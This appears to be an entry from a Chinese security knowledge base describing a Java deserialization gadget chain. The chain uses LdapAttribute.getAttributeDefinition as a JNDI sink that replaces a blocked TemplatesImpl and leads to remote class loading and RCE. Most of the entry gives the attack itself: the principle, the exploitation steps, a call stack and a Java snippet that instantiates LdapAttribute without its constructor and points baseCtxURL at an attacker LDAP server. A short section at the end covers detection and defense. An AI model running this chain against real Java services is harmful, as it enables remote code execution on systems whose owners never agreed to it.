---
id: web-java-deser-jndi-ldapattribute-getattributedefinition-sink
title: LdapAttribute.getAttributeDefinition 作反序列化 JNDI sink：TemplatesImpl 被禁时经 ReflectionFactory 免构造器实例化触发远程类加载
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: ldapattribute-getattributedefinition-jndi-sink
tags:
- java
- deserialization
- jndi
- ldap
- dynamic-proxy
- spring
- rce
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-35
  verified_at: '2026-11-08T18:24:07+08:00'
  notes: 已对照原文核对：LdapAttribute.getAttributeDefinition→getSchema→LdapCtx.c_lookup 调用栈（img21、原文调用栈）、ReflectionFactory 免构造器实例化、rdn/baseCtxURL 设置均与原文一致，img23 弹计算器证明打通；与 hessian 卡（dedup top likely_duplicate 0.9066）场景差异成立：入口不同（Hessian TreeMap.compareTo vs 原生反序列化 MethodInvokeTypeProvider）、JNDI 触发类不同（TargetBeanObjectFactory+SimpleJndiBeanFactory.getBean vs LdapAttribute 内部 getSchema lookup）、场景不同（Hessian 白名单绕过 vs TemplatesImpl 被禁时接口 sink 替代），并列保留；无组件版本标记，affected_versions 留空正确；未验证点：未自行搭建 LDAP 环境复现
url: /docs/web/java/deserialization/jndi/web-java-deser-jndi-ldapattribute-getattributedefinition-sink/
draft: false
kb_aliases:
- LdapAttribute JNDI 链
- getAttributeDefinition sink
- LdapAttribute lookup
---

## 一句话结论

当反序列化 gadget 链要求 sink 方法必须位于接口中（链路前段是动态代理转发）且 TemplatesImpl 等常规 sink 被禁时，`com.sun.jndi.ldap.LdapAttribute` 的 `getAttributeDefinition()`（在 `javax.naming.directory.Attribute` 接口中定义、实现类内部触发 JNDI lookup）可作替代 sink：设置 `baseCtxURL` 指向恶意 LDAP 后，链路走到 `LdapCtx.c_lookup` 完成远程类加载 RCE。

## 原理

- 经 Spring1 这类代理链调用 sink 时，`ReflectionUtils.invokeMethod` 走 `Method.invoke`，要求目标方法来自接口且对象为对应接口的代理——sink 类必须实现某个可代理接口。`JDBCRowSetImpl.getDatabaseMetaData()` 只在实现类中定义，不符合；而 `LdapAttribute` 继承 `BasicAttribute`、实现 `Attribute` 接口，`getAttributeDefinition()` 正是接口方法，满足代理约束。
- `LdapAttribute.getAttributeDefinition()` 内部调用 `getSchema()`（经 InitialDirContext → PartialCompositeDirContext → ComponentDirContext.p_getSchema），最终 `LdapCtx.c_lookup` 按 `baseCtxURL` 发起 LDAP 请求；LDAP 服务端返回的引用/属性可诱导远程类加载（低版本 JDK trustURLCodebase 或配合本地工厂绕过），达到与 TemplatesImpl 链等价的 RCE。
- `LdapAttribute` 构造器对参数有校验且不可直接 new 出合法对象，用 `ReflectionFactory.getReflectionFactory().newConstructorForSerialization(LdapAttribute.class, BasicAttribute(String 构造器))` 借父类构造器免校验实例化；再反射设置 `rdn`（`CompositeName("a//b")`，保证解析路径进入中间节点解析流程）与 `baseCtxURL`（恶意 LDAP 地址）。
- 成立根源：JNDI 接口体系（Attribute）把"取属性 schema"这种看似无害的操作路由到了网络请求，而 LdapAttribute 可被完整序列化配置，二者结合把任意反序列化链的终点指向攻击者控制的 LDAP 服务。

## 触发条件

- 存在可控原生反序列化入口，且链路前段能对代理对象反射调用接口方法（如 Spring1 的 MethodInvokeTypeProvider + ObjectFactoryDelegatingInvocationHandler 三层代理结构）；
- JDK 8（8u65 实测弹出计算器）；目标未禁 `com.sun.jndi.ldap.LdapAttribute`；
- TemplatesImpl 等常规字节码 sink 被黑名单拦截时的替代路径；高版本 JDK 需搭配 trustURLCodebase 绕过（本地工厂/BeanFactory 等）。

## 利用步骤

1. `ReflectionFactory.newConstructorForSerialization` 用 `BasicAttribute(String)` 构造器免校验实例化 `LdapAttribute`。
2. 反射设 `rdn = new CompositeName("a//b")`、`baseCtxURL = "ldap://attacker:port/"`。
3. HashMap{getObject: ldapAttribute} → AnnotationInvocationHandler → 代理 `ObjectFactory` 接口。
4. `ObjectFactoryDelegatingInvocationHandler(objectFactory代理)` 生成实现 `Type`+`Attribute` 双接口的代理（第二接口从 Templates 换成 Attribute，匹配新 sink）。
5. 外层 HashMap{getType: 双接口代理} → 代理 TypeProvider → `MethodInvokeTypeProvider`，`methodName` 设为 `getAttributeDefinition`。
6. 目标 readObject → 反射调用 `getAttributeDefinition()` → LDAP lookup → 远程类加载执行 payload。

## PoC

调用栈（实测弹出计算器）：

```
c_lookup:1085, LdapCtx
c_resolveIntermediate_nns:168, ComponentContext
p_getSchema:432, ComponentDirContext
getAttributeDefinition:207, LdapAttribute
invoke:307, AutowireUtils$ObjectFactoryDelegatingInvocationHandler
invokeMethod:202, ReflectionUtils (org.springframework.util)
readObject:404, SerializableTypeWrapper$MethodInvokeTypeProvider
```

关键构造片段：

```java
Object ldap = createObjWithConstructor(LdapAttribute.class, BasicAttribute.class,
        new Class[]{String.class}, new Object[]{"6924bf"});
setField(ldap, "rdn", new CompositeName("a//b"));
setField(ldap, "baseCtxURL", "ldap://127.0.0.1:50389/");
```

## 变体与关联

- 变体：该 sink 思路可推广到"接口方法内部触发副作用"的其他 JNDI 属性类；与 Oracle RowSet/JdkDynamicAopProxy 组合（oracle-rowset-jdk17-pojo-proxy-rmi 卡）同属代理包装 JNDI sink 家族；
- 关联：yso Spring1/Spring2 链（methodinvoketypeprovider 卡）提供本卡的前半段代理结构；Hessian 场景同 handler 到 JNDI 见 hessian-spring-proxy-invocationhandler-jndi 卡；高版本 JDK 的 LDAP 限制绕过见 jndi 目录各卡。

## 检测与防御

- 反序列化黑名单加入 `com.sun.jndi.ldap.LdapAttribute` 与 `javax.naming.directory.Attribute` 代理；
- 监控反序列化后出现的 LDAP/RMI 出站连接（尤其源自 readObject 调用栈）；
- 启用 JEP 290 反序列化过滤器，限制可反序列化类；高版本 JDK 默认禁远程 codebase 可阻断最终利用，但不消除 lookup 外连。
